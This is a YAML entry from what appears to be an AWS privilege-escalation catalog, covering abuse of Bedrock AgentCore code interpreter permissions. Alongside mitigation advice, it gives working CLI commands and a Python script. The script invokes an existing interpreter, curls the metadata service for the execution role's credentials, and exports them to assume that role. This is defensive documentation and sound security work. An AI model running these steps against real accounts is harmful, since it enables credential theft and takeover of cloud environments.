id: bedrock-002
name: bedrock-agentcore:StartCodeInterpreterSession + bedrock-agentcore:InvokeCodeInterpreter
category: access-resource
services:
- bedrock-agentcore
description: A principal with `bedrock-agentcore:StartCodeInterpreterSession` and `bedrock-agentcore:InvokeCodeInterpreter`
  can access an existing Bedrock AgentCore code interpreter that has a privileged IAM execution role attached. By starting
  a session and invoking arbitrary Python code within the interpreter, an attacker can access the MicroVM Metadata Service
  (MMDS) at 169.254.169.254 to retrieve temporary credentials for the interpreter's execution role. This path doesn't require
  `iam:PassRole` since the role is already attached to the existing interpreter. Similar to `lambda:UpdateFunctionCode`, this
  targets existing resources rather than creating new ones.
prerequisites:
  admin:
  - A Bedrock AgentCore code interpreter must exist with an IAM execution role attached
  - The interpreter's role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)
  - The interpreter must be in a running or ready state
  lateral:
  - A Bedrock AgentCore code interpreter must exist with an IAM execution role attached
  - The interpreter must be in a running or ready state
exploitationSteps:
  awscli:
  - step: 1
    command: aws bedrock-agentcore-control list-code-interpreters
    description: List existing code interpreters to find targets with privileged roles
  - step: 2
    command: aws bedrock-agentcore-control get-code-interpreter --code-interpreter-id INTERPRETER_ID
    description: Check the interpreter's execution role ARN to confirm elevated permissions
  - step: 3
    command: |
      cat << 'EOF' > "get_secrets_from_interpreter.py"
      import boto3
      import sys
      bedrock_agentcore_client = boto3.client('bedrock-agentcore', region_name=sys.argv[2])
      CODE_INTERPRETER_ID = sys.argv[1]

      session = bedrock_agentcore_client.start_code_interpreter_session(
        codeInterpreterIdentifier=CODE_INTERPRETER_ID,
      )
      session_id = session['sessionId']

      code = 'IP="169.254.169.254"; METADATA="meta-data"; curl -s http://$IP/latest/$METADATA/iam/security-credentials/execution_role'

      response = bedrock_agentcore_client.invoke_code_interpreter(
        codeInterpreterIdentifier=CODE_INTERPRETER_ID,
        sessionId=session_id,
        name='executeCommand',
        arguments={'command': code}
      )

      for event in response['stream']:
        if event['result']['structuredContent']['stdout']:
          print(event['result']['structuredContent']['stdout'])
      EOF
    description: Create the python file that will invoke the existing interpreter
  - step: 4
    command: |
      CREDS=$(python3 get_secrets_from_interpreter.py $INTERPRETER_ID $AWS_REGION)
      echo export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r ".AccessKeyId")
      echo export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r ".SecretAccessKey")
      echo export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r ".Token")
    description: Run the python file using the $INTERPRETER_ID to extract credentials
  - step: 5
    command: |
      export AWS_ACCESS_KEY_ID=<AccessKeyId from step 5>
      export AWS_SECRET_ACCESS_KEY=<SecretAccessKey from step 5>
      export AWS_SESSION_TOKEN=<Token from step 5>
      aws sts get-caller-identity
    description: Use the stolen credentials to assume the privileged role's permissions
recommendation: |
  Restrict the `bedrock-agentcore:StartCodeInterpreterSession` and `bedrock-agentcore:InvokeCodeInterpreter`
  permissions using resource-based constraints.

  ```json
  {
    "Effect": "Allow",
    "Action": [
      "bedrock-agentcore:StartCodeInterpreterSession",
      "bedrock-agentcore:InvokeCodeInterpreter"
    ],
    "Resource": "arn:aws:bedrock-agentcore:REGION:ACCOUNT_ID:code-interpreter/SpecificInterpreter"
  }
  ```

  Additional controls:
  - Monitor CloudTrail for `StartCodeInterpreterSession` and `InvokeCodeInterpreter` events on sensitive code interpreters
  - Alert on session creation for interpreters with administrative roles
  - Implement resource tags and condition keys to restrict code interpreter usage
  - Regularly audit execution roles attached to code interpreters
  - Use SCPs to restrict access to sensitive interpreters
  - Enable CloudTrail Data Event logging for code interpreter invocations
  - Implement network isolation for code interpreters processing sensitive data
  - Review and minimize execution role permissions on existing interpreters
discoveredBy:
  name: Nigel Sood
  organization: Sonrai Security
  date: '2025'
references:
- title: 'AWS AgentCore: The Overlooked Privilege Escalation Path in Bedrock AI Tooling'
  url: https://sonraisecurity.com/blog/aws-agentcore-privilege-escalation-bedrock-scp-fix/
- title: 'Sandboxed to Compromised: New Research Exposes Credential Exfiltration Paths in AWS Code Interpreters'
  url: https://sonraisecurity.com/blog/sandboxed-to-compromised-new-research-exposes-credential-exfiltration-paths-in-aws-code-interpreters/
- title: Understanding Credentials Management in Amazon Bedrock AgentCore
  url: https://docs.aws.amazon.com/bedrock-agentcore/latest/devguide/security-credentials-management.html
relatedPaths:
- bedrock-001
- lambda-003
- glue-002
- ec2-002
toolSupport:
  pmapper: false
  iamVulnerable: false
permissions:
  required:
  - permission: bedrock-agentcore:StartCodeInterpreterSession
    resourceConstraints: Target code interpreter must be in the Resource section
  - permission: bedrock-agentcore:InvokeCodeInterpreter
    resourceConstraints: Target code interpreter must be in the Resource section
  additional:
  - permission: bedrock-agentcore:ListCodeInterpreters
    resourceConstraints: List the interpreters that already exist
  - permission: bedrock-agentcore:GetCodeInterpreter
    resourceConstraints: Identify the role associated with the session
attackVisualization:
  nodes:
    - id: start
      label: starting-principal
      type: principal
      description: |
        The principal with bedrock-agentcore:StartCodeInterpreterSession and bedrock-agentcore:InvokeCodeInterpreter permissions. Can be an IAM user or role. This attack targets an existing code interpreter rather than creating a new one, so iam:PassRole is not required.

    - id: code_interpreter
      label: Existing Code Interpreter
      type: resource
      description: |
        An existing Bedrock AgentCore code interpreter with a privileged execution role already attached. The interpreter runs on a Firecracker MicroVM and has access to the MicroVM Metadata Service (MMDS) at 169.254.169.254, similar to EC2's IMDS.

    - id: exfiltrate_creds
      label: Exfiltrate Credentials
      type: action
      color: '#99ccff'
      description: |
        Start a session with the existing code interpreter and invoke Python code to query the MicroVM Metadata Service (MMDS) and retrieve the execution role's temporary credentials.

        The Python code uses boto3 to:
        1. Start a code interpreter session (bedrock-agentcore:StartCodeInterpreterSession)
        2. Invoke code to execute a curl command targeting 169.254.169.254/latest/meta-data/iam/security-credentials/execution_role
        3. Extract AccessKeyId, SecretAccessKey, and SessionToken from the MMDS response

        This is similar to exfiltrating credentials from an EC2 instance via IMDS, but targets the MicroVM's metadata service instead.

    - id: admin
      label: Effective Administrator
      type: outcome
      description: |
        The attacker successfully exfiltrated credentials from the code interpreter and the execution role has AdministratorAccess or equivalent permissions. The attacker now has full administrative access to the AWS account using the stolen credentials.

    - id: some_perms
      label: Check for Additional Access
      type: outcome
      color: '#ffeb99'
      description: |
        The attacker successfully exfiltrated credentials from the code interpreter and the execution role has some elevated permissions (but not full admin). This could provide data access (S3, RDS, DynamoDB) or enable additional privilege escalation paths. The attacker should enumerate the role's permissions to determine what additional access was gained.

    - id: no_access
      label: Minimal Additional Access
      type: outcome
      color: '#cccccc'
      description: |
        The attacker successfully exfiltrated credentials from the code interpreter, but the execution role only has minimal permissions (e.g., logs:PutLogEvents). Limited usefulness for privilege escalation.

  edges:
    - from: start
      to: code_interpreter
      label: Target existing code interpreter
      description: |
        Identify an existing code interpreter that has a privileged execution role attached. Use bedrock-agentcore:ListCodeInterpreters to discover available interpreters and bedrock-agentcore:GetCodeInterpreter to check their execution role ARNs.

        Commands:
        ```bash
        # List existing code interpreters
        aws bedrock-agentcore-control list-code-interpreters

        # Check execution role of specific interpreter
        aws bedrock-agentcore-control get-code-interpreter \
          --code-interpreter-id INTERPRETER_ID
        ```

    - from: code_interpreter
      to: exfiltrate_creds
      label: bedrock-agentcore:StartCodeInterpreterSession + bedrock-agentcore:InvokeCodeInterpreter
      description: |
        Start a session with the existing code interpreter and invoke Python code to extract credentials from the MicroVM Metadata Service (MMDS).

        Execute the Python script that:
        1. Starts a code interpreter session
        2. Executes: `curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/execution_role`
        3. Parses the JSON response to extract AccessKeyId, SecretAccessKey, and SessionToken

        Command:
        ```bash
        # Run the credential extraction script
        python3 get_secrets_from_interpreter.py $INTERPRETER_ID $AWS_REGION
        ```

        The Python script uses the bedrock-agentcore API to invoke arbitrary code within the MicroVM, which can then query the MMDS just like an EC2 instance queries IMDS.

    - from: exfiltrate_creds
      to: admin
      label: If execution role has admin permissions
      branch: A
      condition: admin
      description: |
        If the code interpreter's execution role has AdministratorAccess or equivalent permissions, the attacker gains full administrative access by using the exfiltrated credentials. The attacker can now perform any action in the AWS account.

    - from: exfiltrate_creds
      to: some_perms
      label: If execution role has some elevated permissions
      branch: B
      condition: some_permissions
      description: |
        If the execution role has some elevated permissions (data access, further escalation paths), the attacker can leverage the exfiltrated credentials for lateral movement or additional attacks. The attacker should use `aws sts get-caller-identity` and enumerate permissions to determine what additional access was gained.

    - from: exfiltrate_creds
      to: no_access
      label: If execution role has minimal permissions
      branch: C
      condition: no_permissions
      description: |
        If the execution role only has minimal permissions (like logs:PutLogEvents or basic CloudWatch metrics), the exfiltrated credentials provide limited value for privilege escalation. The attacker may need to target a different code interpreter with a more privileged role.
